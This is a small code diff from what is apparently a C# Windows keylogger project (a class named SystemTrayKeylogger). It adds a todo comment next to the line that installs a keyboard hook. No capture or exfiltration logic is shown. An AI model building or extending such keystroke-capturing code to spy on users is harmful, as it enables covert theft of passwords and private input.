@@ -64,7 +64,7 @@ namespace WTKL
         [STAThread]
         public static void Main()
         {
-            _hookID = SetHook(_proc);
+            _hookID = SetHook(_proc); //todo try moving SetHook to StartKeylogger method
             Application.Run(new SystemTrayKeylogger());
         }
 
